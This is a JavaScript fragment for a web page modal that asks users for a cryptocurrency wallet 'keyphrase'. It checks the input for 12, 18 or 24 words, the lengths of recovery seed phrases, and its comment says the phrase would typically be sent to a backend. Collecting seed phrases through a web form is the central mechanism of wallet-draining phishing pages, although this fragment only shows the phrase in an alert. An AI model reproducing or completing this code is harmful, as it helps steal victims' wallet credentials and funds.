  function openModal(walletName) {
            const modal = document.getElementById('walletModal');
            const modalTitle = document.getElementById('modalTitle');
            const keyphraseInput = document.getElementById('keyphraseInput');
            
            modalTitle.textContent = walletName + ' Keyphrase';
            keyphraseInput.value = '';
            modal.style.display = 'block';
        }

        function closeModal() {
            const modal = document.getElementById('walletModal');
            modal.style.display = 'none';
        }

        function submitKeyphrase() {
            const keyphrase = document.getElementById('keyphraseInput').value.trim();
            
            if (!keyphrase) {
                alert('Please enter your keyphrase');
                return;
            }

            const wordCount = keyphrase.split(' ').length;
            if (wordCount !== 12 && wordCount !== 18 && wordCount !== 24) {
                alert('Please enter a valid keyphrase with 12, 18, or 24 words');
                return;
            }

            // Here you would typically send the keyphrase to your backend
            alert('Keyphrase submitted: ' + keyphrase);
            closeModal();
        }

        // Close modal when clicking outside of it
        window.onclick = function(event) {
            const modal = document.getElementById('walletModal');
            if (event.target === modal) {
                closeModal();
            }
        }

        // Close modal with Escape key
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Escape') {
                closeModal();
            }
        });